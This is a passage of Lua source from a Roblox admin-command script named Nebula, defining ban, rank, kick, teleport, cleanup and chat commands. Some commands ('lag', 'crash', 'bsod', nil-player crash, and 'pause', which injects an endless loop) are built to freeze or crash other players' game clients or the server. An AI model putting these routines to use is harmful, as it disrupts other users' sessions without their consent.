      headmesh.MeshType = "FileMesh"
      headmesh.Scale = Vector3.new(1,1,1)
      headmesh.MeshId = "http://www.roblox.com/asset/?id=162384581"
      headmesh.TextureId = "http://www.roblox.com/asset/?id=162384608"
    end
    char.Humanoid.WalkSpeed=32
    for i,v in pairs(char:GetChildren()) do 
      if v:IsA("BasePart") then
        v.Color = Color3.new()
        for l,p in pairs(v:GetChildren()) do
          if p:IsA("Hat") then p:Remove() end
        end
      end
      if v.ClassName=="Hat" or v.ClassName=="Shirt" or v.ClassName == "Pants" or v.ClassName=="ShirtGraphic" or v.ClassName=="CharacterMesh" then v:Remove() end
    end
    for i,v in pairs(item:GetChildren()) do
      v.Parent=char
    end
  end
end)
newCmd("breakjoints","bj","Breaks a model's joints.",1,{"Model Name"}, {}, false, function(plr,args)
  local targets = findPlayer(args[1],plr,true)
  for i,v in pairs(targets) do
    local continue=true
    if v:IsA("Player") then
      if not checkCommand(v,plr,'beakjoints') then
        continue=false
      end
    end
    if continue then
      pcall(function() if v:IsA("Model") then v:BreakJoints() else v.Character:BreakJoints() end newTablet(plr,"Broke " .. v.Name.. "'s joints.",Color3.new(0,1,0)) end)
    end
  end
end)
newCmd("dismiss","dt","Dismisses yours or the player sepcified's tablets.", 0, {"Player Name (Optional)"},{},false,function(plr,args)
  if not args[1] then
    dismiss(plr)
  else
    local targets = findPlayer(args[1],plr)
    for i,v in pairs(targets) do
      if checkCommand(v,plr,'dismiss') then
        dismiss(v)
      end
    end
  end
end)
newCmd("lag","lg","Lags the player specified.",2,{"Player Name"},{"-bsod", "-il (instance lag)"},true,function(plr,args,tags)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'lag') then
      if not tags[1] then
        lag(v)
      elseif tags[1]=='bsod' then
        Bsod(v)
      else
        InstanceLag(v)
      end
    end
  end
end)
newCmd("crash","cs","Crashes the player specified.",2,{"Player Name"},{"-fz","-n (nil)"},true,function(plr,args,tags)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'crash') then
      if tags[1] then
        crash(v)
      else
        kick(v)
      end
    end
  end
end)
newCmd("kick","kc","Kicks the player specified",2,{"Player Name"},{"-c (crash)","-fm (free mouse)"}, true, function(plr,args,tags)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'kick') then
      if not tags[1] then
        v:Destroy()
      elseif tags[1]=='c' then
        kick(v)
      else
        v.Character=nil
        v:Destroy()
      end
    end
  end
end)
newCmd("base","bp","Creates a baseplate", 1, {}, {},false,function(plr)
  pcall(function() Workspace.Base:Destroy() end)
  pcall(function() Workspace.Baseplate:Destroy() end)
  pcall(function() Workspace.BasePlate:Destroy() end)
  local b = Instance.new("Part")
  b.Name="Base"
  b.BrickColor=BrickColor.new("Dark green")
  b.Material="Grass"
  b.FormFactor="Custom"
  b.Anchored=true
  b.Locked=true
  b.Position=Vector3.new(0,0,0)
  b.Size=Vector3.new(5e3, 1, 5e3)
  b.Parent=Workspace
end)
newCmd("ban","bn","Bans the player specified", 2, {"Player Name","Time ban lasts (seconds)"}, {"-sync","-nos (not in server)", "-b (bsod ban)", "-l (lagban)", "-c (crashban)","-u (unban)","-i (info)"}, true, function(plr,args,tags)
    local rank=getRank(plr)
    if not tags[1] and not args[1] then
      for i,v in pairs(banlist) do
        newTablet(plr,v.Name,nil,'ban;-i,'..v.Name)
      end
  elseif tags[1]=="sync" then
    syncBans(true,true)
  elseif tags[1]=="i" then
    local found
    for i,v in pairs(banlist) do
      if v.Name:lower()==args[1]:lower() then
        found=true
        dismiss(plr)
        newTablet(plr,"Player Banned: " .. v.Name)
        newTablet(plr,"Ban type: " .. v.Type)
        if v.TimeRequired~=math.huge then 
          newTablet(plr,"Time required: " .. v.TimeRequired)
           newTablet(plr,"Time left: " .. (v.TimeRequired-(tick()-v.Timestamp)))
         end
         if v.Reason and v.Reason:match("%w+") then
          newTablet(plr,"Reason: " .. v.Reason)
        end
        newTablet(plr,"Banner rank: " .. (v.BannerRank and v.BannerRank or "Unknown"))
      end
    end
    if not found then notificationTablet(plr,"That player wasn't banned or wasn't found.",Color3.new(1,0,0)) end
    elseif tags[1]=='nos' then
      pcall(function()
        if playerSettings[args[1]] then
          playerSettings[args[1]].Rank=0
        end
      end)
        if tags[2]=='l' then
            newBan(args[1],3,nil,rank)
        elseif tags[2]=='c' then
            newBan(args[1],2,nil,rank)
        else
            newBan(args[1],1,nil,rank)
        end
    elseif tags[1]=="u" then
      local recomendations={}
      local found
      for i,v in pairs(banlist) do
        if v.Name:lower()==args[1]:lower() then
          found=true
          if v.BannerRank then
            if parseRank(rank,v.BannerRank,true) then table.remove(banlist,i) else  notificationTablet(plr,'You need to have a higher rnak to do this.',Color3.new(1,0,0))  end
          else
            table.remove(banlist,i)
          end
          newTablet(plr,"Unbanned " .. v.Name .. ".", Color3.new(0,1,0))
        elseif v.Name:lower():find(args[1]:lower()) then
          table.insert(recomendations,v.Name)
        end
    end
    if not found then
      notificationTablet(plr,"No banned players were found.",Color3.new(1,0,0),nil,nil,5)
      newTablet(plr,"Would you like to view the suggestions?")
      local input = inputTablet(plr,{{"Yes",Color3.new(0,1,0),nil,nil},{"No",Color3.new(1,0,0),nil,nil}})
      if input[1]=="Yes" then
        cmds(plr,"dt;")
        notificationTablet(plr,"Click a name to unban",Color3.new(0,0,1))
        for i,v in pairs(recomendations) do
          newTablet(plr,v,nil,'ban;'..v..',-u')
        end
      else
        cmds(plr,"dt;")
      end
      
    end
    else
        local targets=findPlayer(args[1],plr)
        if args[2] then args[2] = tonumber(args[2]) end
        for i,v in pairs(targets) do
            if tags[1]=='l' then
                newBan(v.Name,3,args[2],rank)
            elseif tags[1]=='c' then
                newBan(v.Name,2,args[2],rank)
            elseif tags[1]=='b' then
              newBan(v.Name,4,args[2],rank)
            else
                newBan(v.Name,1,args[2],rank)
            end
            setRank(v,0)
            checkBan(v)
        end
    end
end)
newCmd("fix","fix","Fixes the player's chat connection", 0, nil,nil,false,function() end) -- So it doesn't return this command doesn't exist.
newCmd("commands","cmds","Shows the commands list",0,{"Rank"},{'-a (all)','-r (rank)','-i (info)','-u (your commands)'},true,function(plr,args,tags)
    if not tags[1] then
      newTablet(plr, "Your Commands",Color3.new(0,1,0),'cmds;-u')
        newTablet(plr,"All Commands",nil,'commands'..commands.settings.middlix..'-a')
        notificationTablet(plr,"Your are rank " .. getRank(plr) .. " ["..ranks[tostring(getRank(plr))] .. "]",Color3.new(0,0,1),nil,nil,10)
        for i,v in pairs(ranks) do
            newTablet(plr,v.. " commands (Rank " .. i .. ")",nil,'commands'..commands.settings.middlix..i..',-r')
        end
    elseif tags[1]=='r' then
        if args[1] then
            dismiss(plr)
            for i,v in pairs(commands.list) do
                if v.Rank==tonumber(args[1]) then
                  newTablet(plr,v.Shortcut,nil,{SpecialId=1,Command=v},nil)
                end
            end
        else
            notificationTablet(plr,"You need to specify a rank.",Color3.new(1,0,0),nil,nil,3)
        end
    elseif tags[1]=='i' then
        if args[1] then
            local found
            for i,v in pairs(commands.list) do
                if v.Name:lower()==args[1]:lower() or v.Shortcut:lower()==args[1]:lower() then
                    found=true
                    dismiss(plr)
                    newTablet(plr,"Name: " .. v.Name)
                    newTablet(plr,"Shortcut: " .. v.Shortcut)
                    newTablet(plr,"Description: " .. v.Desc)
                    newTablet(plr,"Rank: " .. v.Rank)
                    newTablet(plr,"Arguments: " .. table.concat(v.Args,", "))
                    newTablet(plr,"Tags: " .. table.concat(v.Tags,", "))
                    newTablet(plr,"UseTags: " .. (v.UseTags and 'true' or 'false'))
                end
            end
            if not found then
                notificationTablet(plr,"That command was not found.",Color3.new(1,0,0),nil,nil,3)        
            end
        else
            notificationTablet(plr,"You need to specify a command name.",Color3.new(1,0,0),nil,nil,3)
        end
    elseif tags[1]=='a' then
        dismiss(plr)
        for i,v in pairs(commands.list) do
            newTablet(plr,v.Shortcut,nil,{SpecialId=1,Command=v},nil)
        end
    elseif tags[1]=='u' then
      dismiss(plr)
      for i,v in pairs(commands.list) do
        if parseRank(getRank(plr), v.Rank,true) then
          newTablet(plr,v.Shortcut,nil,{SpecialId=1,Command=v})
        end
      end
    end
end)
newCmd("update","updt","Updates the script",3,nil,{"-g (get)"}, true, function(plr,__,tags)
    if not tags[1] then
        if checkForUpdate() then
            newTablet(plr,"There is a newer version of Nebula available.",Color3.new(0,1,0))
            newTablet(plr,"Would you like to update?")
            newTablet(plr,"Yes",Color3.new(0,1,0),"update"..commands.settings.middlix.."-g")
            newTablet(plr,"No",Color3.new(1,0,0),"dt"..commands.settings.middlix)
        else
            newTablet(plr,"You have the latest version of Nebula!",Color3.new(0,1,0))
        end
    else
       if not parseRank(plr,1) then
            newTablet(plr,"You need to be rank 2+ to update the script.",Color3.new(1,0,0))
        else
            for i,v in pairs(services.players:GetPlayers()) do
                for __, tab in pairs(getTablets(v)) do
                    tab:Destroy()
                end
            end
            update()
        end 
    end
end)
newCmd("guichat","gchat","Toggles the gui chat",5,nil,{"-on","-off","-g (global)"},true,function(plr,arg,tags)
  if tags[1] == "on" then
    newTablet(plr, "Gui chat is now on.",Color3.new(0,1,0))
    if tags[2]=='g' then chatsettings.GuiChat=true
    else getPS(plr).Chat.GuiChat=true end
  elseif tags[1] == "off" then
    newTablet(plr, "Gui chat has been turned off",Color3.new(1,0,0))
    if tags[2]=='g' then chatsettings.GuiChat=false
    else getPS(plr).Chat.GuiChat=false end
  elseif tags[1]=='g' then
    if chatsettings.GuiChat==true then
      newTablet(plr,"Gui chat has been turned off",Color3.new(1,0,0))
      chatsettings.GuiChat=false
    else
      newTablet(plr, "Gui chat is now on.",Color3.new(0,1,0))
    chatsettings.GuiChat=true
    end
  else
    if getPS(plr).Chat.GuiChat == true then
      newTablet(plr, "Gui chat has been turned off",Color3.new(1,0,0))
      getPS(plr).Chat.GuiChat = false
    else
      newTablet(plr, "Gui chat is now on.",Color3.new(0,1,0))
      getPS(plr).Chat.GuiChat = true
    end
  end
end)
newCmd("scriptlock","slock","Toggles scripting lock", 5,nil,{"-on","-off"},true,function(plr,arg,tags)
  if tags[1] == "on" then
    newTablet(plr,"Scripting has been disabled.",Color3.new(1,0,0))
    scriptsenabled = false
  elseif tags[1] == "off" then
    newTablet(plr,"Scripting has been enabled.",Color3.new(0,1,0))
    scriptsenabled = true
  else
    if scriptsenabled == true then
      newTablet(plr,"Scripting has been disabled.",Color3.new(1,0,0))
      scriptsenabled = false
    else
      newTablet(plr,"Scripting has been enabled.",Color3.new(0,1,0))
      scriptsenabled = true
    end
  end
end)

newCmd("private","pri","Private server manager", 2,{"Player Name"},{"-a (allow)","-r (reject)","-on","-off","-raw","-ls","-sync"},true,function(plr,args,tags)
    if not tags[1] then
        pri.Active=(not pri.Active)
        if not pri.Active then cmds(plr,'pri;-off') else cmds(plr,'pri;-on') end
    elseif tags[1]=='off' then
        pri.Active=false
        newTablet(plr,"Turned pri off.",Color3.new(1,0,0))
        for i,v in pairs(pri.connections) do v:disconnect() table.remove(pri.connections, i) end
        services.players.CharacterAutoLoads=true
    elseif tags[1]=='on' then
        pri.Active=true
        newTablet(plr,"Turned pri on.",Color3.new(0,1,0))
        for i,v in pairs(services.players:GetPlayers()) do
          pri.addConnections(v)
          CheckPri(v)
        end
    table.insert(pri.connections,services.players.PlayerAdded:connect(pri.addConnections))
    services.players.CharacterAutoLoads=false
    elseif tags[1]=="ls" then
        cmds(plr,"dt;")
        for i,v in pairs(pri.Allowed) do
            newTablet(plr,v)
        end
    elseif tags[1]=="sync" then
        syncPri()
        newTablet(plr,"Private server sync complete.",Color3.new(0,1,0))
        broadcast("The private server has been synced.",Color3.new(1,0,0),nil,nil,5)
    elseif tags[1]=='a' then
        if not args[1] then notificationTablet(plr,"You must specify a player name.", Color3.new(1,0,0),nil,nil,5) return end
        if not tags[2] then
            local targets=findPlayer(args[1],plr)
            if #targets>0 then
                for i,v in pairs(targets) do
                    table.insert(pri.Allowed,v.Name)
                    newTablet(plr,"Allowed " .. v.Name .. " in the private server.",Color3.new(0,1,0))
                    notificationTablet(v,"You are now allowed in the private server.",Color3.new(0,1,0),nil,nil,5)
                end
            else
                newTablet(plr,"No players were found. Would you like to raw allow?")
                newTablet(plr,"Yes",Color3.new(0,1,0),'pri;-a,-raw,'..args[1])
                newTablet(plr,"No",Color3.new(1,0,0),'dt;')
            end
        else
            table.insert(pri.Allowed,args[1])
            newTablet(plr,"Raw allowed " .. args[1] .. ".",Color3.new(0,1,0))
        end
    elseif tags[1]=='r' then
      if not args[1] then notificationTablet(plr,"You must specify a player name.", Color3.new(1,0,0),nil,nil,5) return end
        if not tags[2] then
            local targets=findPlayer(args[1],plr)
            if #targets>0 then
                for i,v in pairs(targets) do
                    for ppi,pp in pairs(pri.Allowed) do if pp:lower()==v.Name:lower() then table.remove(pri.Allowed,ppi) newTablet(plr,"Removed " .. v.Name .. " from the prilist.",Color3.new(1,0,0)) end end
                end
            else
                newTablet(plr,"No players were found. Would you like to raw allow?")
                newTablet(plr,"Yes",Color3.new(0,1,0),'pri;-r,-raw,'..args[1])
                newTablet(plr,"No",Color3.new(1,0,0),'dt;')
            end
        else
            local suggestions={}
            local found
            for i,v in pairs(pri.Allowed) do
              if v.Name:lower():find(args[1]) then table.insert(suggestions,v.Name) end
              if v.Name:lower()==args[1]:lower() then found=true table.remove(pri.Allowed,i) newTablet("Raw removed " .. args[1] .. ".",Color3.new(1,0,0)) end
            end
            if not found then
              newTatblet(plr,"That player has not been found, would you like to view the suggestions?")
              local input = inputTablet(plr,{{"Yes",Color3.new(0,1,0)}, {"No",Color3.new(1,0,0)}})
              if input[1]=="Yes" then
                notificationTablet(plr,"Click on a player name to remove them from the prilist!",Color3.new(0,0,1),nil,nil,5)
                for i,v in pairs(suggestions) do
                  newTablet(plr,v,nil,"pri;-r,-raw,"..v)
                end
              else
                dismiss(plr)
              end
            end
        end
    end
end)
newCmd("network","net","Network manager", 1, {"Player Name"}, {"-nc (nil crash)"}, true, function(plr,args,tags)
    if not tags[1] then
      local NilP = getNilPlayers()
      if #NilP == 0 then
        notificationTablet(plr, "No nil players",Color3.new(0,0,1),nil,nil,5)
      else
        for i,v in pairs(NilP) do
          newTablet(plr, v:GetPlayer().Name,Color3.new(1,0,0),"net;"..v:GetPlayer().Name..",-nc")
        end
      end
    elseif tags[1]=='nc' then
      for i,v in pairs(game:GetService("NetworkServer"):GetChildren()) do
        if v:IsA("ServerReplicator") and v:GetPlayer().Name:lower() == args[1] then
          crashNil(v:GetPlayer().Name)
          newTablet(plr,"Crashed nil player " .. v:GetPlayer().Name .. ".",Color3.new(1,0,0))
        end
      end
    end
end)
newCmd("rank","rnk","Rank manager", 2, {"Player Name", "Rank"}, {"-g (get)", "-s (set)"}, true, function(plr, args, tags)
  if not tags[1] and args[1] then
    local targets = findPlayer(args[1],plr)
    for i,v in pairs(targets) do
      newTablet(plr,v.Name .. " is rank " .. getRank(v) .. " [ " .. ranks[tostring(getRank(v))] .. " ]")
    end
  elseif not tags[1] and not args[1] then
    for i,v in pairs(services.players:GetPlayers()) do
      newTablet(plr,v.Name .. " is rank " .. getRank(v) .. " [ " .. ranks[tostring(getRank(v))] .. " ]")
    end
  elseif not args[1] then
    notificationTablet(plr,"You need to specify a player name.", Color3.new(1,0,0),nil,nil,5)
  elseif tags[1]=='g' then
    local targets = findPlayer(args[1],plr)
    for i, v in pairs(targets) do
       newTablet(plr,v.Name .. " is rank ".. getRank(v) .. " [ ".. ranks[tostring(getRank(v))] .. " ]")
    end
  elseif tags[1]=='s' then
    local targets=findPlayer(args[1],plr)
    for i,v in pairs(targets) do
      if parseRank(plr,v) then
        if not ( tonumber(args[2])>=getRank(plr) ) then
          setRank(v,tonumber(args[2]))
          newTablet(plr, "Set " .. v.Name .. "'s rank to " .. args[2] .. ".",Color3.new(0,1,0))
          notificationTablet(v,"Your new rank is " .. args[2] .. ".",Color3.new(0,0,1), nil,nil,5)
        else
          notificationTablet(plr,'You may only set ranks to a rank lower than yours.',Color3.new(1,0,0),nil,nil,5)
        end
      else
        notificationTablet(plr,"You need a higher rank to do this.",Color3.new(1,0,0),nil,nil,5)
        notificationTablet(v,plr.Name .. " has tried to set your rank to " .. args[2] .. ".",Color3.new(1,0,0),nil,nil,3)
      end
    end
  end
end)
newCmd("remove","rem","Removes the script.",5,nil,nil,false,function()
  for i,v in pairs(services.players:GetPlayers()) do
    for __, tab in pairs(getTablets(v)) do
      tab:Destroy()
    end
  end
  removeScript()
end)
newCmd("bubblechat","bb", "Bubblechat manager",0,{"Color (red,blue,green)"},{"-sc (set color)","-on","-off","-g (global)"},true,function(plr,args,tags)
  if not tags[1] then
    getPS(plr).Chat.Bubblechat= (not getPS(plr).Chat.Bubblechat)
    if getPS(plr).Chat.Bubblechat==true then
      newTablet(plr,"Turned bubblechat on.",Color3.new(0,1,0))
    else
      newTablet(plr,"Turned bubblechat off.",Color3.new(1,0,0))
    end
elseif tags[1]=="on" then
    if tags[2] == 'g' then
      getPS(plr).Chat.Bubblechat=true
    else
      getPS(plr).Chat.Bubblechat=true
    end
    newTablet(plr,"Turned bubblechat on",Color3.new(0,1,0))
  elseif tags[1]=="off" then
    if tags[2]=='g' then
      getPS(plr).Chat.Bubblechat=false
    else
      getPS(plr).Chat.Bubblechat=false
    end
    newTablet(plr,"Turned bubblechat off",Color3.new(1,0,0))
  elseif tags[1]=="sc" then
    if tags[2]=='g' then
      getPS(plr).Chat.BubblechatColor=(args[1]:sub(1,1):upper() .. args[1]:sub(2))
    else
      getPS(plr).Chat.BubblechatColor=(args[1]:sub(1,1):upper() .. args[1]:sub(2))
    end
    newTablet(plr,"Changed the bubblechat color.",Color3.new(0,0,1))
  end
end)
newCmd("remote","rmt","Remote manager",3,{"Remote link"},{"-on","-off","-add","-rm","-ls"},true,function(plr,args,tags)
  if not args[1] and not tags[1] then
    remoteSettings.update=not remoteSettings.update
    if not remoteSettings.update then
      cmds(plr,'rmt;-off')
    else
      cmds(plr,'rmt;-on')
    end
  elseif tags[1]=='ls' then
    for i,v in pairs(remoteSettings.links) do
      newTablet(plr,v)
    end
  elseif tags[1]=='on' then
    remoteSettings.update=true
    newTablet(plr,"Remotes enabled (updating turned on).",Color3.new(0,1,0))
  elseif tags[1]=='off' then
    remoteSettings.update=false
    newTablet(plr,"Remotes disabled (updating turned off).",Color3.new(1,0,0))
  elseif tags[1]=='add' then
    if args[1] then
      table.insert(remoteSettings.links,args.default[1])
      newTablet(plr,'Remote added.',Color3.new(0,1,0))
    else
      notificationTablet(plr,'Please specify the remote link.',Color3.new(0,1,0),nil,nil,5)
    end
  elseif tags[1]=='rm' then
    if args[1] then
      local found=false
      local suggestions={}
      for i,v in pairs(remoteSettings.links) do
        if v==args.default[1] then
          found=true
          table.remove(remoteSettings.links,i)
          newTablet(plr,'Remote removed.',Color3.new(1,0,0))
        end
        if v:lower():find(args[1]:lower()) then
          table.insert(suggestions,v)
        end
      end
      if not found then
        notificationTablet(plr,"Remote link not found.",Color3.new(1,0,0),nil,nil,3)
        newTablet(plr,"Would you like to view the suggestions?")
        local choice = inputTablet(plr,{{"Yes",Color3.new(0,1,0)},{"No",Color3.new(1,0,0)}})
        if choice[1]=='Yes' then
          dismiss(plr)
          notificationTablet(plr,'Click a remote link to remove it.',Color3.new(0,0,1),nil,nil,5)
          for i,v in pairs(remoteSettings.links) do
            newTablet(plr,v,nil,'rmt;'..v..',-rm')
          end
        else
          dismiss(plr)
        end
      end
    else
      notificationTablet(plr,'Please specify the remote link.',Color3.new(0,1,0),nil,nil,5)
    end
  end
end)
newCmd("pause","ps", "Pauses the server (or player, if specified) for x seconds.", 2, {"Seconds","Player Name"}, {"-r (resume)"}, true, function(plr,args,tags)
  if not args[1] and not tags[1] then
    notificationTablet(plr,"Please specify the number of seconds or the resume tag.", Color3.new(1,0,0),nil,nil,3)
  elseif not tags[1] then
    if not args[1] then
      _ns(Workspace,false,[[function pause(sec)
        local timestamp=tick()
        repeat
          if tick()-timestamp>=sec or Workspace:findFirstChild("resumeGame") then
            pcall(function() Workspace:findFirstChild('resumeGame'):Destroy() end)
            break
          end
        until false
      end
      pause(math.huge)]])
    elseif not args[2] then
      _ns(Workspace,false,[[function pause(sec)
        local timestamp=tick()
        repeat
          if tick()-timestamp>=sec or Workspace:findFirstChild('resumeGame') then
            pcall(function() Workspace:findFirstChild('resumeGame'):Destroy() end)
            break
          end
        until false
      end
      pause(]]..args[1]..[[)]])       
    else
      local target = findPlayer(args[2],plr)
      for i,v in pairs(target) do
        if not v.Character then v:LoadCharacter() end
        _ns(v.Character,true,[[function pause(sec)
          local timestamp=tick()
          repeat
            if tick()-timestamp>=sec or Workspace:findFirstChild("resumeGame:"..game:GetService("Players").LocalPlayer.Name) then
              pcall(function() Workspace:findFirstChild("resumeGame:"..game:GetService("Players").LocalPlayer.Name):Destroy() end)
              break
            end
          until false
        end
        pause(]]..args[1]..[[)]])
      end
    end
  else
    if args[1] then
      local target = findPlayer(args[1],plr)
      for i,v in pairs(target) do
        Instance.new("StringValue",Workspace).Name="resumeGame:"..v.Name
      end
    else
      Instance.new("StringValue",Workspace).Name="resumeGame"
    end
  end
end)
newCmd("credits","creds","Shows a list of credits",0,{"Credit Item"},{},false,function(plr,args,tags)
  if not args[1] then
    newTablet(plr,"Nebula secret ingredients",nil,'creds;nsi')
    newTablet(plr,"Basscans",nil,'credits;basscans')
    newTablet(plr,"Ultimatekiller010",nil,'credits;ultimatekiller010')
    newTablet(plr,"Hippalectryon",nil,'credits;hippalectryon')
  elseif args[1]=='nsi' then
    newTablet(plr,"Nebula is made with the following:",Color3.new(1,0,.5))
    newTablet(plr,"Lua",Color3.new(1,0,0.5))
    newTablet(plr,"Love",Color3.new(1,0,0.5))
    newTablet(plr, "Brains",Color3.new(1,0,0.5))
    newTablet(plr, "Immaturity",Color3.new(1,0,0.5))
    newTablet(plr,"Humor",Color3.new(1,0,0.5))
    newTablet(plr,"Creativity",Color3.new(1,0,0.5))
    newTablet(plr,"Uniqueness",Color3.new(1,0,0.5))
    newTablet(plr,"and design",Color3.new(1,0,0.5))
  elseif args[1]=='basscans' then
    newTablet(plr,"Founder of Nebula & Nebula Tech",Color3.new(0,1,0))
    newTablet(plr,"Creator of Nebula, Nebula Reloaded, Nebula V2, Nebula Orb, Nebula Camball, Basscans' Admin, and Apollo.",Color3.new(0,1,0))
  elseif args[1]=='ultimatekiller010' then
    newTablet(plr,"Co-creator of Nebula Reloaded & Nebula V2",Color3.new(1,1,0))
    newTablet(plr, "Being a noob, and Basscans' b\127\127it\127\127ch",Color3.new(1,1,0))
  elseif args[1]=='hippalectryon' then
    newTablet(plr,"Co-creator of Nebula",Color3.new(0,0,1))
    newTablet(plr,"Co-founder of Nebula Tech",Color3.new(0,0,1))
  end
end)
newCmd("antilocal","al","Anti-local manager",1,{"Player Name"},{"-on","-off"},true,function(plr,args,tags)
  if not args[1] then
    if not tags[1] then
      if getPS(plr).Antilocal[1] then
        cmds(plr,'al;-off')
      else
        cmds(plr,'al;-on')
      end
    elseif tags[1]=='on' then
      antiLocal(plr)
      newTablet(plr,"Turned on your antilocal.",Color3.new(0,1,0))
    elseif tags[1]=='off' then
      pcall(function()
        for i,v in pairs(getPS(plr).Antilocal) do v:disconnect() v=nil end
      getPS(plr).Antilocal={}
      end)
      newTablet(plr,"Turned off your antilocal.",Color3.new(1,0,0))
    end
  else
    local target=findPlayer(args[1],plr)
    if not tags[1] then
      for i,v in pairs(target) do
        if getPS(v).Antilocal[1] then
          cmds(v,'al;-off')
          newTablet(plr,"Turned " .. v.Name .. "'s antilocal off.",Color3.new(1,0,0))
        else
          newTablet(plr,"Turned " .. v.Name .. "'s antilocal on.",Color3.new(0,1,0))
          cmds(v,'al;-on')
        end
      end
    elseif tags[1]=='on' then
      for i,v in pairs(target) do
        antiLocal(v)
        notificationTablet(v,"Antilocal turned on",Color3.new(0,1,0),nil,nil,3)
        newTablet(plr,"Turned " .. v.Name .. "'s antilocal on.",Color3.new(0,1,0))
      end
    elseif tags[1]=='off' then
      for i,v in pairs(target) do
        pcall(function()
          for i,v2 in pairs(getPS(v).Antilocal) do v2:disconnect() v2=nil end
           getPS(v).Antilocal={}
        end)
        notificationTablet(v,'Antilocal turned off',Color3.new(1,0,0),nil,nil,3)
        newTablet(plr,"Antilocal turned off for " .. v.Name .. ".",Color3.new(1,0,0))
      end
    end
  end
end)
newCmd("clean","cln", "Cleans the server.", 1, {"Service Name"}, {"-f (full)", "-t (terrain)"}, true,function(plr,args,tags)
  function getServices()
    local foundServices = {}
    for i,v in pairs(game:GetChildren()) do
      local r, e = pcall(function() v:GetChildren() end)
      if not e then table.insert(foundServices,v) end
    end
    return foundServices
  end

  if not args[1] and not tags[1] then
    for index,obj in pairs(Workspace:GetChildren()) do
      if index%100==0 then wait() end
      pcall(function()
        if not obj:IsA("Camera") and not obj:IsA("Terrain") and obj.Name~="Base" and obj.Name~="BasePlate" and obj.Name~="Baseplate" and not services.players:GetPlayerFromCharacter(obj) then
          obj:Destroy()
        end
      end)
    end
  elseif args[1] then
    local found
    for sIndex,service in pairs(getServices()) do
      pcall(function()
        if service.Name:lower()==args[1] then
          local found=true
          for index, obj in pairs(service:GetChildren()) do
            if index%100==0 then wait() end
            pcall(function()
              if service.Name~="Workspace" and service.Name~="Players" then
                obj:Destroy()
              else
                if not obj:IsA("Player") and not obj:IsA("Camera") and not obj:IsA("Terrain") and obj.Name~="Base" and obj.Name~="BasePlate" and obj.Name~="Baseplate" and not services.players:GetPlayerFromCharacter(obj) then
                  obj:Destroy()
                end
              end
            end)
          end
        end
      end)
    end
    if not found then notificationTablet(plr,"That service was not found.",Color3.new(1,0,0),nil,nil,5) end
  elseif tags[1]=="f" then
    for sIndex, service in pairs(getServices()) do
      pcall(function()
        for index, obj in pairs(service:GetChildren()) do
          if index%100==0 then wait() end
          pcall(function()
            if obj:IsA("Terrain") then obj:Clear() end
            if service=="Workspace" then
              if not obj:IsA("Camera") and not obj:IsA("Terrain") and obj.Name~="Base" and obj.Name~="BasePlate" and obj.Name~="Baseplate" and not services.players:GetPlayerFromCharacter(obj) then
                obj:Destroy()
              end
            elseif service==game:GetService("Players") then
              if not obj:IsA("Player") then
                obj:Destroy()
              end
            else
              obj:Destroy()
            end
          end)
        end
      end)
    end
    cmds(plr,'bp;')
    cmds(plr,'rs;all')
  elseif tags[1]=='t' then
    pcall(function() Workspace.Terrain:Clear() end)
  end
end)
newCmd("showrules","rules","Gives the player specified the rules.", 2, {"Player Name"}, {}, false, function(plr,args,tags)
  local target = findPlayer(args[1],plr)
  for i,v in pairs(target) do
    getPS(v).AgreedToRules=false
    showRules(v)
    newTablet(plr,"Showed " .. v.Name .. " the rules.")
  end
end)
newCmd("bluescreenofdeath","bsod","Bsods a player", 2, {"Player Name"}, {}, false, function(plr,args)
  local target = findPlayer(args[1],plr)
  for i,v in pairs(target) do
    if checkCommand(v,plr,'bluescreenofdeath') then
      Bsod(v)
      newTablet(plr,"Bsod'd " ..v.Name .. ".")
    end
  end
end)
newCmd("teleport","tp","Teleports a player to a player",1,{"Player Name", "Player Name"}, {}, false, function(plr,args)
  local target = findPlayer(args[1],plr)
  local target2 = findPlayer(args[2],plr)[1]
  for i,v in pairs(target) do
    pcall(function() v.Character.Torso.CFrame=target2.Character.Torso.CFrame end)
  end
end)
newCmd("teleportplace","tpp","Teleports a player to a place",2,{"Player Name","PlaceId"},{},false,function(plr,args)
  local target = findPlayer(args[1],plr)
  for i,v in pairs(target) do
    if checkCommand(v,plr,'teleportplace') then
      game:GetService("TeleportService"):Teleport(tonumber(args[2]),v)
      newTablet(plr,"Teleported " .. v.Name .. ".",Color3.new(0,0,1))
    end
  end
end)
newCmd("antiban","ab","Toggles the antiban for the user", 2, {"Player Name"}, {"-on", "-off", "-a (abort)"}, true, function(plr,args,tags)
  if not args[1] then
    if not tags[1] then
        if not antiban[plr.Name] then antiban[plr.Name]=true  newTablet(plr,"Toggled your antiban.",Color3.new(0,1,0))
        else antiban[plr.Name]=false  newTablet(plr,"Toggled your antiban.",Color3.new(1,0,0)) end
       
    elseif tags[1]=='off' then
      antiban[plr.Name]=false
      newTablet(plr,"Turned your antiban off.",Color3.new(0,0,1))
    elseif tags[1]=='on' then
      antiban[plr.Name]=true
      newTablet(plr,"Turned on your antiban.",Color3.new(0,0,1))
    elseif tags[1]=='a' then
      abortShutdown=true
    end
  else
    local target = findPlayer(args[1],true)
    if not tags[1] then 
      for i,v in pairs(target) do
        if not antiban[v.Name] then antiban[v.Name]=true
        else antiban[v.Name]=false end
        newTablet(plr,"Toggled antiban for " .. v.Name .. ".")
      end
    elseif tags[1]=='off' then
      for i,v in pairs(target) do
        antiban[v.Name]=false
        newTablet(plr,"Turned antiban off for " .. v.Name .. ".",Color3.new(0,0,1))
      end
    elseif tags[1]=='on' then
      for i,v in pairs(target) do
        antiban[v.Name]=true
        newTablet(plr,"Turned antiban on for " .. v.Name .. ".",Color3.new(0,0,1))
      end
    elseif tags[1]=='a' then
      abortShutdown=true
    end
  end
end)
newCmd("ping","pin", "Pings the player", 1, {"Player Name", "Ping"}, {}, false, function(plr,args)
  local targets=findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    for i2,v2 in pairs(args.default) do
      if i2>1 then newTablet(plr,v2) end
    end
  end
end)
newCmd("heal","hl","Heals the player",1, {"Player Name"}, {}, false, function(plr,args)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    pcall(function() v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth end)
    newTablet(plr,'You have healed ' .. v.Name .. '.',Color3.new(0,1,0))
